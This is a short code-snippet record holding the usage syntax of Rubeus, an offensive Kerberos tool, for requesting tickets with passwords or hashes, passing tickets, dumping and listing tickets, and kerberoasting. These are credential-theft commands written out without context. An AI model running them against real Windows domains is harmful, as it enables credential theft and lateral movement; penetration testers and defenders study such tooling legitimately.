---
id: ab114a68-c2a8-41bf-b7ac-e7b545592758
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:01.852788+00:00'
updated_at: '2023-04-10T20:25:48.421157+00:00'
---

# Code Snippet ab114a68

**Language**: Powershell

```powershell
Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
Rubeus.exe klist [/luid:LOGINID]
Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
```


